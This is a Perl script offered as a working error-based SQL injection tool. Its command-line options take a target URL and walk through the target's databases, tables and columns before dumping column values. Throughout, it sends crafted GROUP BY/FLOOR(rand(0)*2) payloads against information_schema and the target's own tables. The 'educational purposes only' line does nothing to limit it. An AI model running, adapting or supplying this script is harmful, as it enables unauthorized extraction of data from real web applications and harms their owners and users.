#!/usr/bin/perl

# This script will exploit error-based sqli vulnerability.
# Written by Jcynth Tingson
# unfinished but working

use strict;
use warnings;
use LWP::UserAgent;
use Cwd qw( abs_path );
use File::Basename qw( dirname );
use lib dirname(abs_path($0));

use SQLData qw<$ua $loopflag>;
use Getopt::Long;

my $url;
#++OR+1 GROUP BY CONCAT_WS('~',(SELECT CONCAT_WS('0x031337',schema_name, '0x031337') FROM information_schema.schemata LIMIT 0,1), FLOOR(rand(0)*2)) HAVING min(0)--
my $query;
my @db;
my @tables;
my @columns;
my @values;
my $res;
my $counter = 0;
my $getdb = '';
my $gettables = '';
my $dbname;
my $tablename;
my $getcolumns;
my $columns;
my $dumpcol='';
my $limit;
my $help;

GetOptions ('-u=s' => \$url, '-getdb' => \$getdb, '-gettables' => \$gettables,
            '-dbname=s' => \$dbname, '-tablename=s' => \$tablename, '-getcolumns' => \$getcolumns,
            '-columns=s' => \$columns, '-dumpcolumn' => \$dumpcol, '-limit=i' => \$limit, '-help' => \$help);
$limit = 10 if !$limit;
my $usage = <<HTML;
sqli_errorbase.pl -u <target_url> -getdb \tFetch databases
sqli_errorbase.pl -u <target_url> -gettables -dbname <db_name> \t\t #Fetch tables of DB
sqli_errorbase.pl -u <target_url> -getcolumns -dbname <db_name> -tablename <table_name> \t\t #Fetch columns of Table
sqli_errorbase.pl -u <target_url> -dumpcolum -tablename <table_name> -columns col1,col2 -limit 10 \t\t #Dump column values

-limit\tLimit's the result to 'int' e.g -limit 10 limit's the result to 10 records. Default 10
-help\tShows this crappy usage.

Note: in dumping column values. There's a text length limit so it is better to dump 1 column at a time or 2.

Written by Jcynth Tingson. For educational purposes only. Harnessing the power of Perl!
HTML
die($usage) if !$url || $help;
$url =~ s/http\:\/\/www.|https\:\/\/www.|http\:\/\/|https\:\/\///;
&getDB if $getdb;
&getTables if $gettables;
&getColumns if $getcolumns;
&dumpColumn if $dumpcol;

sub dumpColumn{
    @columns = split(',',$columns);
    die("Please limit your columns with 1 or 2") if (scalar @columns > 2);
    my $inj = "concat('0x031337',";
    foreach my $col(@columns){
        $inj .= "$col,'~',";
    }
    $inj =~ s/,$//;
    $inj .= ",'0x031337')";
    while(1){
        
        $query = "++OR+1 GROUP BY CONCAT_WS('~', (SELECT $inj FROM $tablename LIMIT $counter,1), FLOOR(rand(0)*2)) HAVING min(0)--";
        $res = SQLData::parsePage(SQLData::fetchPage($url,"directinject",$query));
        $res = 0 if $counter > $limit; 
        #print $url.$query."\n";exit;
        if(!$res || $res =~ /positive sqli/i){
            $counter = 0;
            if (scalar @values == 0){
                print "No data found! for table: $tablename\n";
                exit;
            }
            print "\nDumping data for table: $tablename | columns: $columns\n";
            for(@values){
                $_ =~ s/~/:::/g;
                print "$_\n";
            }
            last;
        }else{
            print "$counter Data found!\n";
            push(@values, $res);
        }
        $counter++;
        print "Re-sending request... Looking for more data\n";
    }
}

sub getColumns{
    while(1){
        $query = "++OR+1 GROUP BY CONCAT_WS('~',(SELECT concat('0x031337', column_name, '0x031337') FROM information_schema.columns WHERE table_schema='$dbname' AND table_name = '$tablename' LIMIT $counter,1), FLOOR(rand(0)*2)) HAVING min(0)--";
        $res = SQLData::parsePage(SQLData::fetchPage($url,"directinject",$query));
        if(!$res || $res =~ /positive sqli/i){
            $counter = 0;
            print "\nFound all columns for table: $tablename\n";
            for(@columns){
                
                print "$_\n";
            }
            last;
        }else{
            print "$counter Column found!\n";
            push(@columns, $res);
        }
        $counter++;
        print "Re-sending request... Looking for more columns\n";
    }
}

sub getTables{
    while(1){
        print "Fetching tables...\n";
        $query = "++OR+1=1 GROUP BY CONCAT_WS('~',(SELECT concat('0x031337', table_name, '0x031337') FROM information_schema.tables WHERE table_schema='$dbname' LIMIT $counter,1), FLOOR(rand(0)*2)) HAVING min(0)--";
        $res = SQLData::parsePage(SQLData::fetchPage($url,"directinject",$query));
        if(!$res || $res =~ /sql/i){
            $counter = 0;
            print "\nFound all tables for Database: $dbname\n";
            for(@tables){
                print "$_\n";
            }
            last;
        }else{
            print "$counter Table found!\n";
            push(@tables, $res);
        }
        $counter++;
        print "Re-sending request... Looking for more tables\n";
    }
}

sub getDB{
    while(1){
        print "Sending malicious request to fetch Database...\n";
        $query = "++OR+1 GROUP BY concat('~',(SELECT CONCAT('0x031337', schema_name, '0x031337') FROM information_schema.schemata LIMIT $counter,1), FLOOR(rand(0)*2)) HAVING min(0)--";
        $res = SQLData::parsePage(SQLData::fetchPage($url,"directinject",$query));
        
        if(!$res){
            $counter = 0;
            print "\nFound all Databases\n";
            print "Databases: \n";
            for(@db){
                print "$_\n";
            }
            last;
        }else{
            print "$counter Database found!\n";
            push(@db, $res);
        }
        $counter++;
        print "Re-sending request... Looking for more db\n";
    }

}

#my $u = $url."++OR+1 GROUP BY concat('~',(SELECT CONCAT('0x031337', schema_name, '0x031337') FROM information_schema.schemata LIMIT 0,1), FLOOR(rand(0)*2)) HAVING min(0)--";
#print "\n\n$u\n\n";